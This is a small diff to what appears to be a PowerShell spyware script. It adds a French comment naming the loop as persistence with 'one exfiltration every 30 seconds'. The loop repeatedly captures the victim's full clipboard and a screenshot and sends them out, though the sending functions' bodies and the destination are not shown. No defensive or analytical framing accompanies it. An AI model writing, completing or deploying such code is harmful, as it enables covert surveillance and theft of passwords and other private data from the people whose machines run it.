@@ -30,6 +30,7 @@ function Send-ScreenShot {
 }
 
 while ($true) {
+    # Persistence, une exfiltration toutes les 30 secondes
     Send-FullClipboard
     Send-ScreenShot
     Start-Sleep -Seconds 30
